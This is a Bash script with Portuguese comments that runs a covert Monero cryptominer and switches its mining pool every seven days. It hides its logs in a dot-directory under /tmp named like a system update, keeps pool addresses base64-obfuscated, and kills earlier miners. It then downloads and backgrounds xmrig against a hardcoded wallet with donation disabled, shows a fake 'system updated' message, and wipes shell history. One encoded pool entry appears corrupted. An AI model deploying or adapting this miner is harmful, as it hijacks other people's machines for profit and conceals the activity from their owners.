#!/bin/bash
# muda-pool.sh v2.1 - Marcola Protocol

LOG_DIR="/tmp/.update"
LOG_FILE="$LOG_DIR/system-update.log"
LAST_RUN="$LOG_DIR/last_run.txt"
POOL_HISTORY="$LOG_DIR/pool_history.txt"

mkdir -p "$LOG_DIR"
chmod 700 "$LOG_DIR"

# Pools ofuscados em base64
POOLS_B64=(
  "cG9vbC5taW5leG1yLmNvbTo0NDM="           # pool.minexmr.com:443
  "bWluZS5tb25lcm9vY2Vhbi5zdHJlYW06ODA="   # mine.moneroocean.stream:80
  "Z2ulfC5tb25lcm8uc3BhY2U6MTgzMzM="       # gulf.monero.space:18333
  "eG1yLnByb2hhc2gubmV0OjMzMzM="           # xmr.prohash.net:3333
  "cmFuZG9teC5ldS1ubC5ub2RlLm1pbmUuY3g6Nzc3Nw==" # randomx.eu-nl.node.mine.cx:7777
)

# 🔁 SUBSTITUA PELO SEU ENDEREÇO XMR
WALLET="4BDDTir3gpe12zzduhp9Vc3iZpgg5oW71BzH71cmsHv4C31mrRPPCKh2dNpBMQRRdWLXVy91jyfYsgF6MaZjceNu8a1KWgL"

INTERVALO=604800  # 7 dias em segundos
agora=$(date +%s)

# Verifica se já passou o tempo
if [[ -f "$LAST_RUN" ]]; then
  ultima_execucao=$(cat "$LAST_RUN")
  if (( agora - ultima_execucao < INTERVALO )); then
    exit 0
  fi
fi

echo "$(date): Troca de pool iniciada" >> "$LOG_FILE"

# Para mineração antiga
pkill -f "xmrig" 2>/dev/null
pkill -f "wget" 2>/dev/null
echo "$(date): Mineração antiga parada" >> "$LOG_FILE"

# Escolhe novo pool
POOL_B64=${POOLS_B64[$RANDOM % ${#POOLS_B64[@]}]}
POOL=$(echo -n "$POOL_B64" | base64 -d)

echo "$(date): Novo pool: $POOL" >> "$POOL_HISTORY"
echo "$(date): Pool ativado: $POOL" >> "$LOG_FILE"

# Baixa e inicia novo xmrig
nohup wget -qO- https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64 | tar -xz && \
chmod +x xmrig && \
./xmrig \
  -o "$POOL" \
  -u "$WALLET" \
  --donate-level=0 \
  --cpu-max-threads-hint=60 \
  --background > /dev/null 2>&1 &

# Atualiza timestamp
echo "$agora" > "$LAST_RUN"

echo "$(date): Nova mineração ativa com $POOL" >> "$LOG_FILE"
echo "✅ Sistema atualizado."

# Limpa histórico
history -c && history -w